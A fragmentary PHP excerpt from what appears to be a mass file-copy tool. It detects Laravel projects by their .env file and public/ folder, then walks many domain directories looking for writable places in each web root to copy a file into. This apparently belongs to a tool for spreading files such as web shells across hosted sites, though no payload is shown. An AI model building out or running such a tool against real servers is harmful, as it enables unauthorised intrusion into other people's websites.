...
function geckoMassIsLaravelApp($dir)
{
    ...
    // Laravel project root: .env + public/ (e.g. artisan apps)
    return @is_file($dir . '/.env') && @is_dir($dir . '/public');
}
...
function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 0, $offset = 0, $v3 = false, $mode = '')
{
    ...
    foreach ($targets as $target) {
        ...
        // v1/v2/v3: Laravel (.env + public/) → scan writable from public/ only
        $webRoot = geckoMassResolveCopyWebRoot($domainDir, $mode);
        $urlRoot = $webRoot;
        if (geckoMassLaravelPublicDir($domainDir) !== '') {
            $log('  Laravel detected (.env + public/) -> scan from: ' . $webRoot);
        }
        $log('  webRoot: ' . $webRoot);
        $candidates = array();
